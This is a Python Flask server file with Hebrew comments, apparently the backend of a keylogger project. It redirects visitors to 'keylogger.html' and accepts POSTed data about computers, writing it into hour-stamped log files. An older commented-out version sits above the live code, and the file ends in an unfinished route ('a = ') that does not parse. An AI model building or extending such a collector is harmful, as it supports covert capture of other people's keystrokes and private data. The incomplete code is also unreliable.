# from flask import Flask, jsonify, request, redirect
# from flask_cors import CORS
# import search

# app = Flask(__name__)
# CORS(app)



# @app.route('/')
# def index():
#     return redirect('/keylogger.html')


# @app.route('/api/computers', methods=['GET'])
# def get_computers():
#     computers = search.create_computers_list()
    
#     return jsonify(computers)


# @app.route('/api/computers', methods=['POST'])
# def add_computer():
#     new_computer = request.json

#     if any(c["id"] == new_computer["id"] for c in computers):
#         return jsonify({"error:this computer exist "}), 400

#     computers.append(new_computer)
#     return jsonify(new_computer), 201


# if __name__ == '__main__':
#     app.run(debug=True)
from flask import Flask, jsonify, request, redirect
from flask_cors import CORS
import os
from datetime import datetime
import search  # נשאר כמו בקוד שלך

app = Flask(__name__)
CORS(app)

BASE_DIR = "logs"  # כאן יישמרו הקבצים לפי זמן


# פונקציה לשמירה לפי תאריך ושעה
def save_data_with_time(data):
    now = datetime.now()
    date_str = now.strftime("%Y-%m-%d")   # לדוגמה: 2025-09-03
    hour_str = now.strftime("%H")         # לדוגמה: 14

    # יוצרים תקייה לפי תאריך
    date_dir = os.path.join(BASE_DIR, date_str)
    os.makedirs(date_dir, exist_ok=True)

    # שם הקובץ לפי שעה
    file_path = os.path.join(date_dir, f"{hour_str}.txt")

    # כותבים נתון חדש
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(data + "\n")

    return file_path


@app.route('/')
def index():
    return redirect('/keylogger.html')


# 🔹 מחזיר רשימת מחשבים (באמצעות search)
@app.route('/api/computers', methods=['GET'])
def get_computers():
    computers = search.create_computers_list()
    return jsonify(computers)


# 🔹 מוסיף מחשב + שומר אותו לפי זמן
@app.route('/api/computers', methods=['POST'])
def add_computer():
    new_computer = request.json

    # כאן אפשר לבדוק אם כבר קיים (אם נשמור ברשימה גלובלית)
    # כרגע שומרים ישירות לקובץ
    file_path = save_data_with_time(str(new_computer))

    return jsonify({
        "status": "computer saved",
        "path": file_path,
        "data": new_computer
    }), 201
@app.route('/api/add_info' , methods = ["post"])
def add_info():
    a = 


if __name__ == '__main__':
    app.run(debug=True)
